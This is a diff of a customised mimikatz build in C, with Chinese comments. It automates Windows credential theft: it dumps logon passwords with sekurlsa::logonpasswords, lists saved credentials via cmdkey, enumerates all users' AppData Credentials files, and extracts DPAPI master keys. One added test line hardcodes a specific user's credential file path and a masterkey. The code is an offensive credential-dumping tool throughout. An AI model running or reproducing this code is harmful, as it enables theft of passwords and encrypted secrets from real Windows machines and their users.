@@ -80,47 +80,53 @@ int wmain(int argc, wchar_t * argv[])
 			//status = mimikatz_dispatchCommand(input);
 		//}
 
+
+		//获取用户信息
 		Getalluser();
 		// 获取 cmdkey /list
 		kprintf(L"========== cmdkey /list Result =========\n");
 		system("cmdkey /list");
 		////提权
 		kprintf(L"========== privilege::debug Result =========\n\n");
-		wcscpy_s(input, _countof(input), L"privilege::debug");
-		status = mimikatz_dispatchCommand(input);
+		//wcscpy_s(input, _countof(input), L"privilege::debug");
+		//status = mimikatz_dispatchCommand(input);
+		status = mimikatz_dispatchCommand(L"privilege::debug");
 		////获取密码
 		kprintf(L"\n========== sekurlsa::logonpasswords Result =========\n");
-		wcscpy_s(input, _countof(input), L"sekurlsa::logonpasswords");
-		status = mimikatz_dispatchCommand(input);
+		/*wcscpy_s(input, _countof(input), L"sekurlsa::logonpasswords");
+		status = mimikatz_dispatchCommand(input);*/
+		status = mimikatz_dispatchCommand(L"sekurlsa::logonpasswords");
 
 		kprintf(L"\n==========dpapi::cred /in: Part =========\n");
 		wchar_t temp_buf[MAX_PATH];
 		//1、遍历数组元素，根据目前用户信息的个数循环
 		int i = 0;
-		do 
+		do
 		{
-				// 2、根据用户名确定遍历路径
-				wsprintf(temp_buf, L"C:\\Users\\%s\\AppData\\Local\\Microsoft\\Credentials\\", user_info[i].username);
+			// 2、根据用户名确定遍历路径
+			wsprintf(temp_buf, L"C:\\Users\\%s\\AppData\\Local\\Microsoft\\Credentials\\", user_info[i].username);
 
-				// 3、遍历存储用户名终端会话记录目录里的所有文件
-				if (wcscmp(user_info[i].username, L""))
-				{
-					// 3.1 遍历当前目录文件
-					Traversal(temp_buf);
-				}
-				else
-				{
-					break;
-				}
+			// 3、遍历存储用户名终端会话记录目录里的所有文件
+			if (wcscmp(user_info[i].username, L""))
+			{
+				// 3.1 遍历当前目录文件
+				Traversal(temp_buf);
+			}
+			else
+			{
+				break;
+			}
 
 			i++;
 
-		} while (i < _countof(user_info));
+			//} while (i < _countof(user_info));
+		} while (i < g_user_info_flag);
 		
-
+			
 
 		// 4、 用户名终端会话记录目录文件的GUID
-		for (int i = 0; i < _countof(file_info); i++)
+		//for (int i = 0; i < _countof(file_info); i++)
+		for (int i = 0; i < g_file_info_flag; i++)
 		{
 			if (wcscmp(file_info[i].filepath, L""))
 			{
@@ -139,12 +145,19 @@ int wmain(int argc, wchar_t * argv[])
 
 		}
 
+		//测试
+
+		
+		status = mimikatz_dispatchCommand(L"dpapi::cred /in:C:\Users\AT\AppData\Local\Microsoft\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:1955edf764404b2bc6cf8b60b6719b20c78982e3e11493639d7e975e8ce8a6977fff4364de6858724ce8bc4f704b47937ab2eefe7c171c8d1f18e2ac6ee6c0da");
+
 		// 4.2、根据GUID获取对应的Masterkey
 		kprintf(L"\n========== sekurlsa::dpapi Part =========\n");
 		// 导入当前这个命令到全局命令数组，对比临时命令
-		wcscpy_s(g_input, _countof(g_input), L"sekurlsa::logonpasswords");
+		//wcscpy_s(g_input, _countof(g_input), L"sekurlsa::logonpasswords");
         // 输入命令
 		status = mimikatz_dispatchCommand(L"sekurlsa::dpapi");
+
+
 
 
 
@@ -229,6 +242,7 @@ int wmain(int argc, wchar_t * argv[])
 
 
 
+//遍历目录
 void Traversal(const TCHAR *lpszPath)
 {
 	WIN32_FIND_DATA ffd;
@@ -248,7 +262,10 @@ void Traversal(const TCHAR *lpszPath)
 		return;
 	}
 	// 文件路径信息计数
-	int nCout = 0;
+	//int nCout = 0;
+	g_file_info_flag = 0;
+
+
 
 	do {
 		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
@@ -278,10 +295,13 @@ void Traversal(const TCHAR *lpszPath)
 			wcscat_s(szShowPath, _countof(szShowPath), ffd.cFileName);
 
 			//wprintf(L"%s\n", szShowPath);
-			wcscpy_s(file_info[nCout].filepath, _countof(file_info[nCout].filepath), szShowPath);
+			wcscpy_s(file_info[g_file_info_flag].filepath, _countof(file_info[g_file_info_flag].filepath), szShowPath);
 
 			//文件路径信息
-			nCout++;
+			//nCout++;
+			// 文件路径信息加1
+			g_file_info_flag = g_file_info_flag + 1;
+
 		}
 	} while (FindNextFile(hFind, &ffd));
 
@@ -292,6 +312,9 @@ void Traversal(const TCHAR *lpszPath)
 //获取所有用户
 void Getalluser()
 {
+
+	//用户数目标记
+	g_user_info_flag = 0;
 
 	LPUSER_INFO_0 pBuf = NULL;
 	LPUSER_INFO_0 pTmpBuf;
@@ -342,6 +365,9 @@ void Getalluser()
 					wcscpy_s(user_info[i].username, _countof(user_info[i].username), pTmpBuf->usri0_name);
 					pTmpBuf++;
 					dwTotalCount++;
+
+					g_user_info_flag = g_user_info_flag + 1;
+
 				}
 			}
 		}
